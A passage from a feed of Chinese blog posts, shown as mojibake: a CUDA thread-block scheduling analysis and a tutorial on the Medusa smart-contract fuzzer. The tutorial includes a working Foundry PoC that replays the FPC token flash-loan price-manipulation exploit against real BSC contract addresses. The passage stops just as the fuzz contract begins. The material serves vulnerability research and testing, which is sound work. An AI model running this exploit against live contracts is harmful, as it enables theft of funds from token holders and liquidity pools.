nofollow\" target=\"_blank\">ç”¨ PHP ç©è½¬å›¾ç‰‡ï¼šç¼©æ”¾ã€è£å‰ªã€æ°´å°ã€æ»¤é•œä¸€ç½‘æ‰“å°½</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-01-31 08:40</span>&nbsp;\n<a href=\"https://www.cnblogs.com/catchadmin\">JaguarJack</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">21</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">1</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "CUDAæ˜¯å¦‚ä½•è°ƒåº¦Thread Blockçš„ï¼Ÿ",
      "link": "https://www.cnblogs.com/DemoFX/p/19556140",
      "published": "",
      "description": "<div class=\"postTitle\">\n\t\t<a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/DemoFX/p/19556140\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-31 00:25\">\n    <span>CUDAæ˜¯å¦‚ä½•è°ƒåº¦Thread Blockçš„ï¼Ÿ</span>\n    \n\n</a>\n\n\t</div>\n\t    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        cuda\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<p>æœ€è¿‘åœ¨çœ‹CUDA,è®²åˆ°C++æ˜¯æ€ä¹ˆè°ƒç”¨CUDAå‡½æ•°è¿›è€ŒåŠ è½½è¿›GPUå†…æ ¸è¿›è¡Œè¿è¡Œçš„ï¼Œç½‘ä¸ŠåŸºæœ¬ä¸Šå…¨éƒ¨éƒ½æ˜¯ä¸€æ ·çš„èµ„æ–™ï¼Œåªè®²GridåŒ…å«å¾ˆå¤šThread block,æ¯ä¸ªThread blockåªèƒ½åŠ è½½åˆ°ä¸€ä¸ªSMä¸­è¿›è¡Œå¹¶è¡Œè¿ç®—ï¼Œç„¶åå°±æ˜¯çº¿ç¨‹åˆ†ç±»åˆ°warpä¸­è¿›è¡Œåˆ†ç»„è®¡ç®—ï¼Œç½‘ä¸Šå¤§å¤šè®²çš„æ˜¯è¿™äº›ï¼Œå…·ä½“thread blockæ€ä¹ˆåˆ†é…åˆ°SMå°±æ²¡è®²æ¸…æ¥šï¼Œä»Šå¤©æ¥ç‚¹è‡ªå·±çš„åˆ†æã€‚</p>\n<p><img alt=\"block1\" class=\"lazyload\" height=\"153\" width=\"298\" /></p>\n<p>æ˜¾å¡çš„ç¡¬ä»¶é…ç½®ï¼Œåªæœ‰3ä¸ªSMå•å…ƒï¼Œæ€»å…±åªæœ‰12ä¸ªç¡¬ä»¶warpï¼Œä½†æ˜¯è¿è¡Œè½¯ä»¶è°ƒè¯•å‘ç°ï¼Œè‡³å°‘æœ‰ä¸€ç™¾å¤šä¸ªè½¯ä»¶warpåŒæ—¶è¿è¡Œï¼Œå¦‚æœæŒ‰ç…§æ¯ä¸ªThread Blockåªé…ç½®åˆ°ä¸€ä¸ªSMæ¥è®¡ç®—ï¼Œæ€»å…±åº”è¯¥åªæœ‰12ä¸ªè½¯ä»¶warpæ‰å¯¹ï¼Œå¤šå‡ºæ¥çš„warpå“ªæ¥çš„ï¼Ÿå…¶å®è¿™åªæ˜¯ä¸€ç§è½¯ä»¶æ¨¡æ‹Ÿå®ç°çš„â€œå¹¶è¡Œ\"è®¡ç®—ï¼Œç”¨æ¯”ç¡¬ä»¶æ•°ç›®å¤šçš„è½¯ä»¶warpæé«˜ç¡¬ä»¶çš„è®¡ç®—ååé‡ï¼Œå¦ä¸€æ–¹é¢ï¼Œä¸€ä¸ªSMå¯ä»¥åŒæ—¶æ”¯æŒå¤šä¸ªThread blockçš„è¿è¡Œï¼Œè¿™æ˜¯å¾ˆå¤šæ–‡æ¡£éƒ½æ²¡æœ‰ä»‹ç»çš„å†…å®¹ï¼Œä¹Ÿæ˜¯æœ¬æ–‡çš„é‡ç‚¹ã€‚</p>\n<p><img alt=\"code\" class=\"lazyload\" height=\"291\" width=\"419\" /></p>\n<p>é¦–å…ˆçœ‹ä»£ç ï¼Œä»£ç å¾ˆç®€å•ï¼Œåªæ˜¯ä¸ªæ™®é€šçš„kernelå‡½æ•°ã€‚ä¸‹é¢çš„åˆ†æç”¨åˆ°Cuda Toolkité‡Œé¢è‡ªå¸¦çš„profileå·¥å…·nvvp.<br />\né¦–å…ˆåœ¨hostç«¯è°ƒç”¨ä¸Šè¿°ä»£ç ï¼š<br />\nmykernelfunc &lt;&lt;&lt; 2, 1&gt;&gt;&gt; ();ç”¨nvvpæŸ¥çœ‹å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œ</p>\n<p><img alt=\"1\" class=\"lazyload\" height=\"201\" width=\"401\" /></p>\n<p>ä¸€å…±å°±3ä¸ªSM,ä¸¤ä¸ªThread blockç”¨äº†ä¸¤ä¸ªï¼Œè¯´æ˜Thread blockåœ¨åˆ†é…SMçš„æ—¶å€™æ˜¯é¦–å…ˆæŒ‘é€‰ç©ºä½™çš„SMæ¥è¿è¡Œï¼Œå¹¶æ²¡æœ‰ä¸¤ä¸ªThread blockè¿è¡Œåˆ°ä¸€ä¸ªSMçš„æƒ…å†µã€‚<br />\nmykernelfunc &lt;&lt;&lt; 4, 1&gt;&gt;&gt; ();è¿™ä¸ªæœ‰4ä¸ªThread blockï¼Œæ˜¾ç„¶3ä¸ªSMä¸å¤Ÿåˆ†ï¼Œè‚¯å®šå¤šå‡ºæ¥ä¸€ä¸ªã€‚</p>\n<p><img alt=\"2\" class=\"lazyload\" height=\"200\" width=\"418\" /><br />\n<img alt=\"3\" class=\"lazyload\" height=\"94\" width=\"424\" /></p>\n<p>ä»ä¸Šå›¾èƒ½çœ‹å‡ºæ¥ï¼Œä¸‰ä¸ªSMå·²ç»å…¨éƒ¨è¢«å ç”¨äº†ï¼Œå¹³å‡ä¸‹æ¥æ¯ä¸ªSMæœ‰1.33ä¸ªwarp,è¯´æ˜å¤šå‡ºæ¥çš„é‚£ä¸ªwarp,å·²ç»è¢«åˆ†é…è¿›æŸä¸ªSMé‡Œé¢ã€‚<br />\nè¿™ä¸ªå–4ä¸ªthread blockåˆ†åˆ°3ä¸ªSMï¼Œä¸å¥½åˆ†ï¼Œæˆ‘ä»¬æ¢ä¸ªï¼š<br />\nmykernelfunc &lt;&lt;&lt; 96, 64&gt;&gt;&gt; ();</p>\n<p><img alt=\"6\" class=\"lazyload\" height=\"99\" width=\"420\" /></p>\n<p>è¿™é‡Œå–äº†96ä¸ªthread block,åˆ†åˆ°3ä¸ªSMé‡Œï¼Œæ¯ä¸€ä¸ªå¯ä»¥åˆ†åˆ°32ä¸ªï¼Œ64è¡¨ç¤º64ä¸ªçº¿ç¨‹ï¼Œè¿™æ ·ä¸€å…±æ˜¯64ä¸ªwarp,å·²ç»è¾¾åˆ°ç¡¬ä»¶æé™äº†ï¼Œç†è®ºä¸Šè¾¾åˆ°100%çš„ç¡¬ä»¶å ç”¨ç‡ï¼Œå®é™…æµ‹è¯•è¾¾åˆ°99.5%çš„Occupancy.<br />\nä½†æ˜¯å¦‚æœä½¿ç”¨äº†shared memory,æƒ…å†µå°±ä¼šæœ‰å¾ˆå¤§çš„ä¸åŒã€‚</p>\n<p><img alt=\"7\" class=\"lazyload\" height=\"171\" width=\"425\" /></p>\n<p>è¿™é‡Œåˆ†é…äº†24kçš„å…±äº«å†…å­˜ï¼Œä½†å®é™…çš„warpå°±é™åˆ°äº†24ä¸ªã€‚</p>\n<p><img alt=\"10\" class=\"lazyload\" height=\"430\" width=\"800\" /></p>\n<p>ä»”ç»†çœ‹ä¸Šé¢å…³äºGPU utilityçš„è¯´æ˜ï¼Œè¿™é‡Œå…¶å®æ˜¯å…³é”®æ‰€åœ¨ï¼Œkernelä»£ç ä½¿ç”¨äº†24kçš„shared memory,è€Œæ¯ä¸ªSMçš„æœ€å¤§shared memoryæ˜¯96k,æ­£å¥½æ˜¯4å€ï¼Œè€Œè¿è¡Œçš„Thread blockæ•°ç›®ä¹Ÿæ˜¯4ä¸ªï¼Œè¿™è¯´æ˜ä»€ä¹ˆï¼Ÿè¿™è¯´æ˜ï¼ŒThread blockåœ¨åˆ†é…SMçš„æ—¶å€™ï¼Œé¦–å…ˆå‚è€ƒkernelä¸­ä½¿ç”¨çš„shared memoryçš„å¤§å°ï¼Œæ•´ä¸ªSMçš„shared memoryèƒ½è£…ä¸‹å‡ ä¸ªkernelçš„shared memoryå°±ä½¿ç”¨å‡ ä¸ªThread block,è¿™å…¶å®æ˜¯make senseçš„ï¼Œå› ä¸ºkernelå ç”¨çš„shared memoryå±äºç¡¬ä»¶è¦æ±‚ï¼Œä¸æ»¡è¶³è‡ªç„¶æ— æ³•è¿è¡Œã€‚</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n\t<div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-01-31 00:25</span>&nbsp;\n<a href=\"https://www.cnblogs.com/DemoFX\">demofx</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">24</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "Medusa - æ™ºèƒ½åˆçº¦ Fuzzing å·¥å…·ä»‹ç»ä¸æ¡ˆä¾‹è®²è§£",
      "link": "https://www.cnblogs.com/ACaiGarden/p/19556121",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/ACaiGarden/p/19556121\" id=\"cb_post_title_url\" title=\"å‘å¸ƒäº 2026-01-31 00:04\">\n    <span>Medusa - æ™ºèƒ½åˆçº¦ Fuzzing å·¥å…·ä»‹ç»ä¸æ¡ˆä¾‹è®²è§£</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"èƒŒæ™¯\">èƒŒæ™¯</h1>\n<p>Fuzzï¼ˆæ¨¡ç³Šæµ‹è¯•ï¼‰æ˜¯ä¸€ç§é€šè¿‡è‡ªåŠ¨ç”Ÿæˆå¤§é‡éšæœºæˆ–åŠéšæœºè¾“å…¥æ¥æµ‹è¯•ç¨‹åºï¼Œä»¥å‘ç°æ„å¤–è¡Œä¸ºã€å´©æºƒæˆ–æ¼æ´çš„è½¯ä»¶æµ‹è¯•æŠ€æœ¯ã€‚<br />\nMedusa æ˜¯ç”± Trail of Bits å¼€å‘çš„å¼€æºæ™ºèƒ½åˆçº¦æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼ŒåŸºäº go-ethereum æ„å»ºï¼Œçµæ„Ÿæ¥æºäºå…¶å‰èº« Echidnaã€‚å®ƒä¸“é—¨ç”¨äºæ£€æµ‹ Solidity æ™ºèƒ½åˆçº¦ä¸­çš„æ¼æ´å’Œé€»è¾‘é”™è¯¯ã€‚<br />\nMedusa çš„æ ¸å¿ƒå·¥ä½œåŸç†æ˜¯ï¼šå¼€å‘è€…å®šä¹‰ä¸€ç»„ä¸å˜é‡ï¼ˆå³åœ¨ä»»ä½•æƒ…å†µä¸‹éƒ½åº”ä¿æŒä¸ºçœŸçš„æ¡ä»¶ï¼‰ï¼Œå·¥å…·ä¼šè‡ªåŠ¨ç”Ÿæˆå¤§é‡éšæœºäº¤æ˜“åºåˆ—å°è¯•è¿åè¿™äº›ä¸å˜é‡ã€‚ä¸€æ—¦æŸä¸ªäº¤æ˜“åºåˆ—å¯¼è‡´ä¸å˜é‡è¿”å› falseï¼Œå³è¡¨æ˜å‘ç°äº†æ½œåœ¨æ¼æ´ã€‚<br />\nMedusa è¿˜æ”¯æŒé“¾ä¸Šåˆçº¦ fork æµ‹è¯•ã€HTML è¦†ç›–ç‡æŠ¥å‘Šç”Ÿæˆç­‰åŠŸèƒ½ï¼Œé€‚ç”¨äºä»å¼€å‘é˜¶æ®µçš„å®‰å…¨æµ‹è¯•åˆ°ä¸“ä¸šå®¡è®¡çš„å„ç±»åœºæ™¯ã€‚</p>\n<ul>\n<li>Githubï¼š<a href=\"https://github.com/crytic/medusa\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/crytic/medusa</a></li>\n<li>Docsï¼š<a href=\"https://github.com/crytic/medusa/blob/master/docs/src/SUMMARY.md\" rel=\"noopener nofollow\" target=\"_blank\">https://github.com/crytic/medusa/blob/master/docs/src/SUMMARY.md</a></li>\n</ul>\n<h1 id=\"éƒ¨ç½²ä¸ä½¿ç”¨\">éƒ¨ç½²ä¸ä½¿ç”¨</h1>\n<p>æ¥ä¸‹æ¥ç›´æ¥è¿›å…¥æ­£é¢˜ï¼Œå¦‚ä½•å®‰è£…ã€é…ç½®ä»¥åŠä½¿ç”¨ Medusa</p>\n<h2 id=\"å®‰è£…\">å®‰è£…</h2>\n<p>è¿è¡Œä»¥ä¸‹çš„å‘½ä»¤å®‰è£… medusa çš„æœ€æ–°ç‰ˆæœ¬ï¼š</p>\n<pre><code>go install github.com/crytic/medusa@latest\n</code></pre>\n<h2 id=\"åˆçº¦é¡¹ç›®åˆ›å»º\">åˆçº¦é¡¹ç›®åˆ›å»º</h2>\n<p>é¦–å…ˆåˆ›å»ºä¸€ä¸ª foundry é¡¹ç›®ï¼Œå°†éœ€è¦ fuzz çš„ä»£ç æ”¾åˆ°è¯¥é¡¹ç›®ä¸­ï¼Œå®Œæˆç›¸å…³çš„é…ç½®ï¼Œç¡®ä¿èƒ½å¤ŸæˆåŠŸ buildã€‚</p>\n<blockquote>\n<p>foundry å¼€å‘æ¡†æ¶ï¼š<a href=\"https://getfoundry.sh/\" rel=\"noopener nofollow\" target=\"_blank\">https://getfoundry.sh/</a></p>\n</blockquote>\n<h2 id=\"medusa-åˆ›å»ºä¸é…ç½®\">Medusa åˆ›å»ºä¸é…ç½®</h2>\n<p>åœ¨ foundry é¡¹ç›®è·¯å¾„ä¸‹æ‰§è¡Œ <code>medusa init</code> å‘½ä»¤ï¼Œå°†ä¼šåœ¨ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª <code>medusa.json</code> æ–‡ä»¶ï¼Œè¿™æ˜¯ fuzz çš„é…ç½®æ–‡ä»¶ã€‚<br />\nå…¶ä¸­æœ‰ä¸€äº›å…³é”®çš„é…ç½®é¡¹ï¼š</p>\n<pre><code>1. targetContractsï¼šè¦ fuzz çš„åˆçº¦åç§°ï¼ˆåç»­ä¼šç¼–å†™å¯¹åº”çš„ Fuzz åˆçº¦ï¼‰\n2. Fork é…ç½®ï¼š\n\t- forkModeEnabled: å¼€å¯ fork æ¨¡å¼\n\t- rpcUrl: é“¾çš„ RPC èŠ‚ç‚¹\n\t- rpcBlock: fork çš„åŒºå—é«˜åº¦\n3. cheatCodesï¼šå¯ä»¥é‡‡ç”¨éƒ¨åˆ†çš„ foundry cheat codeï¼Œä¸”ä½¿ç”¨æ–¹æ³•æŒ‰ç…§ medusa æ–‡æ¡£æä¾›çš„æ–¹å¼ä½¿ç”¨ã€‚\n4. æ€§èƒ½é…ç½®ï¼š\n  1. workersï¼šåŒæ—¶å·¥ä½œçš„æ ¸å¿ƒæ•°\n  2. callSequenceLengthï¼šå•æ¬¡è°ƒç”¨åºåˆ—æœ€å¤§é•¿åº¦ï¼ˆä¸€æ¬¡è°ƒç”¨æœ€å¤šå¯ä»¥æ‰§è¡Œå¤šå°‘ä¸ªå‡½æ•°ï¼‰\n  3. timeoutï¼šè¿è¡Œæ—¶é—´\n</code></pre>\n<p>åœ¨é…ç½®å®Œæˆåï¼Œå¯ä»¥æ‰§è¡Œä»¥ä¸‹ä»£ç å¼€å§‹ fuzzï¼Œå…¶ä¸­ <code>--config</code> å‚æ•°æ”¯æŒæŒ‡å®šé…ç½®æ–‡ä»¶ï¼Œä¸æŒ‡å®šé»˜è®¤ä¸º <code>medusa.json</code> æ–‡ä»¶ã€‚</p>\n<pre><code>medusa fuzz --config medusa.onchain.json\n</code></pre>\n<h1 id=\"fuzz-å‡½æ•°ç¼–å†™\">Fuzz å‡½æ•°ç¼–å†™</h1>\n<h2 id=\"å‡½æ•°ä»‹ç»\">å‡½æ•°ä»‹ç»</h2>\n<p>ä½¿ç”¨ Medusa å¯¹åˆçº¦è¿›è¡Œ fuzz éœ€è¦ç¼–å†™ä¸¤ç§å‡½æ•°ï¼š</p>\n<ul>\n<li>å…¬å…±å‡½æ•°ï¼š<code>external</code> æˆ– <code>public</code> ç±»å‹çš„å‡½æ•°ã€‚</li>\n<li>property å‡½æ•°ï¼šå‡½æ•°åç§°ä¸º <code>property_*</code> çš„å‡½æ•°ï¼Œåœ¨å‡½æ•°å†…ç¼–å†™éœ€è¦æ£€æŸ¥çš„ä¸å˜é‡æ¡ä»¶ï¼ˆæ¯”å¦‚æ‰€æœ‰ç”¨æˆ·ä½™é¢çš„æ€»å’Œå°äº totalSupplyï¼‰ã€‚<br />\nå› ä¸º Medusa åœ¨ fuzzing çš„è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆä¼šæŠŠåˆçº¦çš„ <code>public</code>/<code>external</code> å‡½æ•°éƒ½å½“æˆâ€œå¯è°ƒç”¨åŠ¨ä½œâ€ï¼Œå®ƒä¼šéšæœºç»„åˆè‹¥å¹²ä¸ªå…¬å…±å‡½æ•°ä½œä¸ºè°ƒç”¨é“¾ï¼ŒæŒ‰é¡ºåºè¿›è¡Œè°ƒç”¨ã€‚åœ¨æ‰§è¡Œå®Œè°ƒç”¨é“¾åï¼Œä¼šè°ƒç”¨æ‰€æœ‰çš„ property å‡½æ•°è¿›è¡Œæ£€æŸ¥ï¼Œå¦‚æœæœ‰ä»»æ„å‘Šè­¦æ¡ä»¶è¢«è§¦å‘ï¼Œè¿”å› fuzz æˆåŠŸçš„ç»“æœã€‚</li>\n</ul>\n<blockquote>\n<p>å¦‚æœå­˜åœ¨ä¸éœ€è¦åœ¨ fuzz è¿‡ç¨‹ä¸­è¢«ç›´æ¥è°ƒç”¨çš„å‡½æ•°ï¼ˆæ¯”å¦‚ callback ç±»å‹å‡½æ•°ï¼‰ï¼Œéœ€è¦æ·»åŠ æ£€æŸ¥é™åˆ¶ï¼Œå¦‚æœä¸æ»¡è¶³è°ƒç”¨æ¡ä»¶ç›´æ¥ returnï¼ˆæ¯”å¦‚ <code>msg.sender == POOL</code>ï¼‰ï¼Œå¦åˆ™ä¼š revert ä»è€Œæµªè´¹å¤§é‡çš„èµ„æºã€‚</p>\n</blockquote>\n<h2 id=\"åˆçº¦ä»‹ç»\">åˆçº¦ä»‹ç»</h2>\n<p>é¦–å…ˆï¼Œéœ€è¦æ ¹æ® fuzz çš„åœºæ™¯é€‰æ‹©ä¸åŒçš„ç¼–å†™æ–¹æ¡ˆï¼š</p>\n<ol>\n<li>å¦‚æœæ˜¯æœ¬åœ° fuzzï¼Œä¸æ¶‰åŠåˆ°é“¾ä¸ŠçŠ¶æ€ã€‚é‚£ä¹ˆå¯ä»¥æ–°å»ºä¸€ä¸ª fuzz åˆçº¦ï¼Œå¯¹ç›®æ ‡åˆçº¦è¿›è¡Œç»§æ‰¿ï¼Œç„¶åç¼–å†™ç›¸å…³çš„ property å‡½æ•°è¿›è¡Œæ£€æŸ¥ã€‚targetContracts é€‰æ‹© fuzz åˆçº¦ã€‚</li>\n<li>å¦‚æœæ˜¯ fork fuzzï¼Œéœ€è¦åœ¨é“¾ä¸ŠçŠ¶æ€åŸºç¡€ä¸Šè¿›è¡Œã€‚é‚£ä¹ˆå¯ä»¥æ–°å»ºä¸€ä¸ª fuzz åˆçº¦ï¼Œè®¾è®¡å¥½æ‰€éœ€è¦çš„å…¬å…±å‡½æ•°ï¼Œè´Ÿè´£è°ƒç”¨ç›®æ ‡åˆçº¦çš„æ¯ä¸ªåŠŸèƒ½ï¼Œç„¶åç¼–å†™ç›¸å…³çš„ property å‡½æ•°è¿›è¡Œæ£€æŸ¥ã€‚targetContracts é€‰æ‹© fuzz åˆçº¦ã€‚</li>\n</ol>\n<blockquote>\n<p>åœ¨ fork fuzz åœºæ™¯çš„å…¬å…±å‡½æ•°ä¸­ï¼Œæ¯ä¸ªè¾“å…¥çš„å‚æ•°éƒ½ç”± medusa æä¾›ï¼Œç”±äºè¾“å…¥æ˜¯å˜åŒ–çš„ï¼Œæ‰€ä»¥è¦æ‰‹å·¥åšå¾ˆå¤šè¾“å…¥å€¼å’Œä¸­é—´å€¼çš„æ£€æŸ¥ï¼Œä¸ç¬¦åˆçš„ç›´æ¥ returnã€‚</p>\n</blockquote>\n<h1 id=\"å®æˆ˜æ¡ˆä¾‹\">å®æˆ˜æ¡ˆä¾‹</h1>\n<p>æ¥ä¸‹æ¥é€šè¿‡ä¸€ä¸ªæ¼æ´ä»£å¸çš„æ¡ˆä¾‹æ¥è¿›è¡Œå®æˆ˜åˆ†æï¼Œç”±äºæ˜¯åˆæ¬¡å°è¯•ä½¿ç”¨ Medusaï¼Œæ‰€ä»¥é‡‡å–å…ˆäº†è§£æ¼æ´ï¼Œå†ç¼–å†™èƒ½å¤Ÿå°†æ¼æ´æµ‹å‡ºæ¥çš„ fuzz è§„åˆ™çš„æ–¹å¼è¿›è¡Œã€‚</p>\n<h2 id=\"æ¡ˆä¾‹ä»‹ç»\">æ¡ˆä¾‹ä»‹ç»</h2>\n<p>æ¡ˆä¾‹é‡‡ç”¨çš„æ˜¯æˆ‘ä»¬ä¹‹å‰åšè¿‡åˆ†æçš„ <a href=\"https://www.cnblogs.com/ACaiGarden/p/19458550\" target=\"_blank\" title=\"FPC Token æ”»å‡»äº‹ä»¶\">FPC Token æ”»å‡»äº‹ä»¶</a></p>\n<p>FPC æ˜¯ BPE-20 é¡¹ç›®ï¼Œå®ç°äº†å¤æ‚çš„äº¤æ˜“æœºåˆ¶ï¼ŒåŒ…æ‹¬ä¹°å–æ‰‹ç»­è´¹ã€æµåŠ¨æ€§æ± ç‡ƒçƒ§æœºåˆ¶ã€é™åˆ¶äº¤æ˜“é¢‘ç‡ã€é™åˆ¶äº¤æ˜“æ•°é‡ç­‰åŠŸèƒ½ã€‚æ¼æ´äº§ç”Ÿçš„åŸå› æ˜¯å½“ç”¨æˆ·å–å‡ºä»£å¸æ—¶ï¼Œåˆçº¦ä¼šä»æµåŠ¨æ€§æ± ä¸­ç‡ƒçƒ§ä»£å¸ï¼ˆè€Œéä»å–å‡ºè€…ä½™é¢ä¸­ç‡ƒçƒ§ï¼‰ï¼Œå¯¼è‡´æ± å­ä¸­ FPC ä»£å¸æ•°é‡å‡å°‘ï¼Œä»·æ ¼æŠ¬é«˜ã€‚</p>\n<p>æ”»å‡»æµç¨‹å¦‚ä¸‹ï¼š</p>\n<ol>\n<li>æ”»å‡»è€…é€šè¿‡é—ªç”µè´·è·å¾—å¤§é‡çš„ USDT</li>\n<li>åœ¨ [FPC, USDT] æ± å­ä¸­è´­ä¹°å¤§é‡çš„ FPC</li>\n<li>æŠŠ FPC è½¬ç§»åˆ°æ–°çš„åœ°å€ä¸­</li>\n<li>å‡ºå”®æ‰€æœ‰çš„ FPCï¼šå…ˆè§¦å‘æµåŠ¨æ€§æ± ç‡ƒçƒ§æœºåˆ¶ï¼Œæ¨é«˜äº† FPC çš„ä»·æ ¼ï¼Œç„¶åå†è®¡ç®—å‡ºå”®è·å¾—çš„ USDTï¼Œä»è€Œè·å¾—è¶…é¢çš„åˆ©æ¶¦ã€‚</li>\n</ol>\n<p><img alt=\"image\" src=\"https://img2024.cnblogs.com/blog/1483609/202601/1483609-20260108195418546-1108887978.png\" /></p>\n<h2 id=\"fuzz-åˆçº¦ç¼–å†™\">Fuzz åˆçº¦ç¼–å†™</h2>\n<p>é¦–å…ˆå¤ç°äº†è¿™ä¸ªæ”»å‡»çš„ PoCï¼Œç„¶åæ ¹æ® PoC æ¥ç¼–å†™ Medusa çš„ fuzz åˆçº¦ã€‚</p>\n<h3 id=\"poc\">PoC</h3>\n<p>ä½¿ç”¨æ—¶è¯·è‡ªè¡Œæ›¿æ¢ YOUR_RPC ä¸º RPC é“¾æ¥ã€‚</p>\n<pre><code class=\"language-solidity\">// SPDX-License-Identifier: MIT\npragma solidity ^0.8.22;\n\nimport \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\n/// @notice Minimal interfaces used by this PoC (avoid importing full ABIs).\ninterface IPancakeV3PoolLike {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n}\n\n/// @dev Kept for reference; this PoC uses `vm.startPrank/stopPrank`.\ninterface IStdCheats {\n    // Sets the *next* call's msg.sender to be the input address\n    function prank(address) external;\n\n    // Sets all subsequent call's msg.sender (until stopPrank is called) to be the input address\n    function startPrank(address) external;\n\n    // Stops a previously called startPrank\n    function stopPrank() external;\n}\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\n\ninterface IUniswapV2Router02 {\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint256 amountIn,\n        uint256 amountOutMin,\n        address[] calldata path,\n        address to,\n        uint256 deadline\n    ) external;\n}\n\ninterface IPancakeV3Pool {\n    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;\n    function mint(address recipient, uint256 amount0, uint256 amount1) external;\n    function burn(address to, uint256 amount0, uint256 amount1) external;\n    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;\n    function sync() external;\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\n    function token0() external view returns (address);\n    function token1() external view returns (address);\n}\n\n/// @title FPC exploit PoC (BSC mainnet fork)\n/// @notice This test is a forked, on-chain PoC focusing on the transaction shape.\ncontract FPCExploitForkTest is Test {\n    // ----------------------------\n    // Constants (BSC mainnet)\n    // ----------------------------\n    address public constant USDT = 0x55d398326f99059fF775485246999027B3197955;\n    address public constant FPC = 0xB192D4A737430AA61CEA4Ce9bFb6432f7D42592F;\n\n    /// @notice Pancake V3 pool used as the flash source (USDT/USDC pool).\n    address public constant FLASH_POOL_ADDR = 0x92b7807bF19b7DDdf89b706143896d05228f3121;\n    address public constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n    address public constant POOL = 0xa1e08E10Eb09857A8C6F2Ef6CCA297c1a081eD6B;\n\n    /// @notice Attacker EOA (as observed on-chain).\n    address public constant HACKER = 0xC2a81942627f6929521397eef6173F271D1fB456;\n\n    /// @notice Flashloan amount used in the PoC (units: USDT 18 decimals on BSC).\n    uint256 public constant FLASHLOAN_AMOUNT = 23020000 ether;\n\n    /// @dev Fork to the target block height to match on-chain state at exploitation time.\n    function setUp() public {\n        vm.createSelectFork(\"YOUR_RPC\", 52624700);\n    }\n\n    /// @notice Entry point: request a USDT flash and rely on the callback for execution.\n    function test_exploit() public {\n        IERC20(USDT).approve(ROUTER, type(uint256).max);\n        IERC20(FPC).approve(ROUTER, type(uint256).max);\n\n        // 1. Flashloan USDT from Pancake V3 Pool\n        IPancakeV3PoolLike(FLASH_POOL_ADDR).flash(address(this), FLASHLOAN_AMOUNT, 0, \"0x00\");\n    }\n\n    /// @notice Pancake V3 flash callback.\n    /// @dev The body intentionally mirrors the PoC transaction sequence.\n    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        // 2. Swap against target pool to acquire FPC\n        IPancakeV3Pool(POOL).swap(1e18, 790178970489172772916652, address(this), \"0x00\");\n\n        // 3. Transfer FPC to hacker EOA\n        IERC20(FPC).transfer(HACKER, IERC20(FPC).balanceOf(address(this)));\n\n        // 4. Sell FPC -&gt; USDT via router (as hacker)\n        address[] memory sellPath = new address[](2);\n        sellPath[0] = FPC;\n        sellPath[1] = USDT;\n\n        vm.startPrank(HACKER);\n        IERC20(FPC).approve(ROUTER, type(uint256).max);\n        IUniswapV2Router02(ROUTER)\n            .swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                247441170766403071054109, 0, sellPath, address(this), block.timestamp\n            );\n        vm.stopPrank();\n\n        // 5. Repay flash + fee and log remaining USDT as profit\n        uint256 repayAmount = FLASHLOAN_AMOUNT + fee0;\n        IERC20(USDT).transfer(FLASH_POOL_ADDR, repayAmount);\n        console.log(\"profit:\", IERC20(USDT).balanceOf(address(this)));\n    }\n\n    /// @notice Pancake V2-style callback (for pool interactions).\n    /// @dev Included to match the PoC behavior; sender/amount args are intentionally unused.\n    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        IERC20(USDT).transfer(POOL, 23020001000000000000000000);\n    }\n}\n\n</code></pre>\n<h3 id=\"fuzz-åˆçº¦\">Fuzz åˆçº¦</h3>\n<ul>\n<li>fuzz_swap() å‡½æ•°çš„ flashloanAmount å‚æ•°æ˜¯ç”± medusa æä¾›çš„éšæœºå€¼ã€‚</li>\n<li>pancakeV3FlashCallback å’Œ  pancakeCall å‡½æ•°ä¸ºäº†é¿å…è¢«ç›´æ¥è°ƒç”¨ä¼šåœ¨å¼€å§‹æ—¶æ£€æŸ¥è°ƒç”¨è€…ï¼Œä¸ç¬¦åˆçš„ç›´æ¥ return ä¸ä¸­æ–­ fuzz sequence çš„è°ƒç”¨ã€‚</li>\n</ul>\n<p>ä¿å­˜åˆ° <code>src/OnchainExploitDetector.sol</code> æ–‡ä»¶ä¸­</p>\n<pre><code class=\"language-solidity\">// 